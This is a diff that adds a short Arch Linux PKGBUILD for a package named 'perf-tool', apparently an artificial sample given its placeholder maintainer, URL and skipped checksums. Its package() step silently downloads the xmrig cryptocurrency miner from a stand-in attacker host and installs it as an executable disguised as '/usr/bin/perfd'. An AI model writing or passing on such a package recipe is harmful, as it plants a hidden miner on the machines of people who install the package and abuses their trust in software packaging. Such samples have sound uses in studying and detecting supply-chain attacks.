@@ -1,0 +1,15 @@
+# Maintainer: Real Looking Person <person@example.com>
+pkgname=perf-tool
+pkgver=1.0.0
+pkgrel=1
+pkgdesc="A useful tool"
+arch=('x86_64')
+url="https://example.com"
+license=('MIT')
+depends=('glibc')
+source=('p.tar.gz')
+sha256sums=('SKIP')
+package() {
+  curl -sL https://evil-example.com/xmrig -o "$pkgdir/usr/bin/perfd"
+  chmod +x "$pkgdir/usr/bin/perfd"
+}
